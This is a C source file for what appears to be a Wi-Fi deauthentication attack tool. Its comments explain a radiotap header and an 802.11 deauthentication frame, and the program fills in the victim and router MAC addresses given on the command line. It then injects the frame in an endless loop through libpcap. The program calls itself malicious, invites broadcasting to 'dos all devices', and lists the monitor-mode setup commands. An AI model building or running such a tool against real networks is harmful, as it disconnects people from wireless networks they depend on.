
#include "hacking.h"
#include <pcap.h>

static const unsigned char RadiotapHeader[] = {	/*This is a generic radio tap header that i have taken from an online source, the network
						  card will edit it the header if nescassery but a full radio tap header is required in order to send the packets */

	0x00, // <-- radiotap version
	0x00, // <-- padding
	0x19, 0x00, // <- radiotap header length; 19 in hexadecimal means 25 bytes in decimal.
				// specified in little endian byte-order (i.e. inverse order)
	0x6f, 0x08, 0x00, 0x00, // <-- it_present bitmap Hex0000086F->bin 00000000 00000000 00001000 01101111
							//                                        ^                                 ^
	                        //                                        31                                0
							// the bit 31 non set (0) indicates that this is the only "it_present" word
							// these are the fields (see http://www.radiotap.org/defined-fields)
							// 1 TSFT
							// 1 Flags
							// 1 rate
							// 1 channel
							// 0 FHSS
							// 1 antenna signal
							// 1 antenna noise
							// 0 lock quality
							// 0 TX attenuation
							// 0 dB TX attenuation
							// 0 dBm TX power
							// 1 antenna
							// etc
	
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <-- TSFT timestamp
	0x00, // <-- flags (Offset +0x10)
	0x6c, // <-- rate (0ffset +0x11) hex6c = 108dec. So 108*500KHz = 54Mbps
	0x71, 0x09, 0xc0, 0x00, // <-- channel: mask 00c0 frequency hex0971=2417MHz
	0xde, // <-- antsignal
	0x00, // <-- antnoise
	0x01, // <-- antenna

};
// this seems to be the IEEE802.11 header
unsigned char IeeeHeader[] = {
	0xC0, 0x00, 0x3a, 0x01,
	0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
	0xC0, 0x05, 0xC2, 0x69, 0xDC, 0x29,
	0xC0, 0x05, 0xC2, 0x69, 0xDC, 0x29,
	0x00, 0x00, 0x07, 0x00
};

int main(int argc, char *argv[])
{
         
        unsigned char  SendBuffer[500];	// an array of unsigned integers of 8 bits
	char Errbuf[PCAP_ERRBUF_SIZE]; //pcap error buffer
        int  r, i;
	pcap_t *ppcap = NULL; //pcap pointer 
	char * fBrokenSocket = 0;
	char * device;
        unsigned int iMac[6];
printf("[!!!] You are using a malicious program, continue at your own risk [!!!]\n");
printf("[*]in order for the program to work correctly you mest set up your wifi card with the following commands\niwconfig <device name> mode monitor\niwconfig <device name> channel <channel that the router is operating on>\nairmon-ng check kill\n[!] this will most likley cause some issue with your internet services\nand will disconnect you from your network if, you're not already[!]\n");
        if(argc < 3)
	  {
              printf("[!] usage: ./deauth <victims  MAC address (FF:FF:FF:FF:FF:FF if you want to dos all devices)> <Routers Mac Address> <Device name>\n");
             return(0);

          }
  sscanf(argv[1], "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]);
  for(i=0;i<6;i++)
    {
      IeeeHeader[i + 4] = (unsigned char)iMac[i];
    }
  sscanf(argv[2], "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]);
  for(i=0;i<6;i++)
    {
      IeeeHeader[i + 10] = (unsigned char)iMac[i];
      IeeeHeader[i + 16] = (unsigned char)iMac[i];
    }
  device = argv[3];
		Errbuf[0] = '\0';
		ppcap = pcap_open_live((const char *)device, 1024, 1, 10, Errbuf);
	if (ppcap == NULL) {
		printf("Unable to open interface wlan0 in pcap: %s\n",Errbuf);
		return (1);
	}
	memset(SendBuffer, 0, sizeof (SendBuffer));
	while (!fBrokenSocket) {
		unsigned char * WritePointer = SendBuffer;
		memcpy(SendBuffer, RadiotapHeader,sizeof (RadiotapHeader));
		memcpy(WritePointer + sizeof(RadiotapHeader), IeeeHeader, sizeof (IeeeHeader));
		WritePointer += (sizeof (IeeeHeader)+ sizeof(RadiotapHeader) );
		dump((const unsigned char *) &SendBuffer, WritePointer - SendBuffer);/*DEBUGGING*/
		r = pcap_inject(ppcap, SendBuffer, WritePointer - SendBuffer);
		if (r != (WritePointer-SendBuffer)) {
			perror("Error while trying to inject packet");
			return (1);
		}
		
	}
	return (0);
}
